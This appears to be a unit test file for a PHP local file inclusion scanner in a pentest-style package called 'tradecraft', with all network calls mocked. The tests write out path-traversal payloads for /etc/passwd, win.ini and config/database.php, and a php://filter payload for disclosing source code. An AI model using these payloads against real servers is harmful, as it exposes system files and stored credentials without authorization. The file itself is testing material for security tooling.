"""
Unit tests for php_lfi adapter and tool layer.
"""
from __future__ import annotations

import base64
from unittest.mock import MagicMock, patch

import pytest
import requests

from tradecraft.adapters.php_lfi import execute as lfi_execute
from tradecraft.adapters.php_lfi import parse as lfi_parse
from tradecraft.tools.php_lfi import PhpLfi


def test_normalize_target_url():
    assert lfi_parse.normalize_target_url("example.com") == "http://example.com"
    assert lfi_parse.normalize_target_url("http://example.com") == "http://example.com"
    assert lfi_parse.normalize_target_url("https://example.com/index.php") == "https://example.com/index.php"
    assert lfi_parse.normalize_target_url("   ") == ""


def test_parse_host_port():
    assert lfi_parse.parse_host_port("http://example.com") == ("example.com", 80)
    assert lfi_parse.parse_host_port("https://example.com/index.php") == ("example.com", 443)
    assert lfi_parse.parse_host_port("http://example.com:8080/view") == ("example.com", 8080)


def test_build_lfi_payloads_default():
    payloads = lfi_parse.build_lfi_payloads()
    assert len(payloads) >= 8
    payload_strings = [p[0] for p in payloads]
    assert "../../../../../../../../etc/passwd" in payload_strings
    assert "php://filter/convert.base64-encode/resource=index.php" in payload_strings
    assert "../../../../../../../../windows/win.ini" in payload_strings


def test_build_lfi_payloads_custom_target():
    payloads = lfi_parse.build_lfi_payloads(target_file="config/database.php")
    payload_strings = [p[0] for p in payloads]
    assert "../../../../../../../../config/database.php" in payload_strings
    assert "php://filter/convert.base64-encode/resource=config/database.php" in payload_strings


def test_build_probe_url():
    url1 = lfi_parse.build_probe_url("http://example.com/index.php", "page", "../../../../etc/passwd")
    assert url1 == "http://example.com/index.php?page=../../../../etc/passwd"

    # Replace parameter and preserve others
    url2 = lfi_parse.build_probe_url(
        "http://example.com/index.php?category=1&page=about", "page", "php://filter/convert.base64-encode/resource=index.php"
    )
    assert "category=1" in url2
    assert "page=php://filter/convert.base64-encode/resource=index.php" in url2


def test_check_lfi_response_passwd():
    body = "Some text before\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
    matched, ftype, snippet = lfi_parse.check_lfi_response(body)
    assert matched is True
    assert ftype == "/etc/passwd"
    assert "root:x:0:0" in snippet


def test_check_lfi_response_win_ini():
    body = "; for 16-bit app support\n[fonts]\nArial=arial.ttf\n"
    matched, ftype, snippet = lfi_parse.check_lfi_response(body)
    assert matched is True
    assert ftype == "win.ini"
    assert "16-bit app support" in snippet or "[fonts]" in snippet


def test_check_lfi_response_php_filter():
    php_code = "<?php\necho 'Secret DB password: ' . $db_pass;\n?>"
    encoded = base64.b64encode(php_code.encode()).decode()
    body = f"<html><body>{encoded}</body></html>"
    matched, ftype, snippet = lfi_parse.check_lfi_response(body)
    assert matched is True
    assert ftype == "php://filter source"
    assert "<?php" in snippet


def test_check_lfi_response_clean():
    body = "<html><body><h1>Welcome to My Website</h1><p>Normal content.</p></body></html>"
    matched, ftype, snippet = lfi_parse.check_lfi_response(body)
    assert matched is False
    assert ftype == ""
    assert snippet == ""


def test_execute_empty_inputs():
    res1 = lfi_execute.execute(target="", parameter="page")
    assert res1.error == "empty target URL"

    res2 = lfi_execute.execute(target="http://example.com", parameter="")
    assert res2.error == "missing required parameter"


def test_execute_successful_confirmation():
    mock_session = MagicMock()
    # First response is normal 200, second contains passwd signature
    resp1 = MagicMock()
    resp1.status_code = 200
    resp1.url = "http://example.com/view.php?page=1"
    resp1.text = "Hello world"

    resp2 = MagicMock()
    resp2.status_code = 200
    resp2.url = "http://example.com/view.php?page=/etc/passwd"
    resp2.text = "root:x:0:0:root:/root:/bin/bash\n"

    mock_session.get.side_effect = [resp1, resp2]

    res = lfi_execute.execute(
        target="http://example.com/view.php",
        parameter="page",
        session=mock_session,
    )

    assert res.tested_count == 2
    assert len(res.probes) == 2
    parsed = lfi_parse.parse_lfi_result(res)
    assert parsed["vulnerable"] is True
    assert parsed["file_disclosed"] == "/etc/passwd"
    assert parsed["payload_used"] is not None


def test_execute_network_error():
    mock_session = MagicMock()
    mock_session.get.side_effect = requests.RequestException("Connection refused")

    res = lfi_execute.execute(
        target="http://example.com/view.php",
        parameter="page",
        session=mock_session,
    )

    assert res.tested_count > 0
    parsed = lfi_parse.parse_lfi_result(res)
    assert parsed["vulnerable"] is False
    assert "Connection refused" in (parsed["error"] or "")


def test_tool_run_and_evidence():
    tool = PhpLfi()
    assert tool.tool_id == "php_lfi"

    with patch("tradecraft.adapters.php_lfi.execute.execute") as mock_exec:
        mock_raw = lfi_parse.RawLfiResult(
            target="https://target.com/index.php",
            parameter="view",
            tested_count=1,
            probes=[
                lfi_parse.RawLfiProbe(
                    payload="../../../../etc/passwd",
                    file_description="/etc/passwd",
                    status_code=200,
                    body="root:x:0:0:root:/root:/bin/bash\n",
                )
            ],
        )
        mock_exec.return_value = mock_raw

        result = tool.run(target="https://target.com/index.php", parameter="view")
        assert result["vulnerable"] is True
        assert result["file_disclosed"] == "/etc/passwd"

        evidence = tool.extract_evidence({"target": "https://target.com/index.php"}, result)
        assert evidence is not None
        host, full = evidence
        assert host == "target.com"
        assert full["parameter"] == "view"

        facts = tool.extract_facts({"target": "https://target.com/index.php"}, result)
        assert len(facts) == 1
        assert facts[0]["host"] == "target.com"
        assert facts[0]["lfi_vulnerable"] is True
        assert facts[0]["lfi_parameter"] == "view"
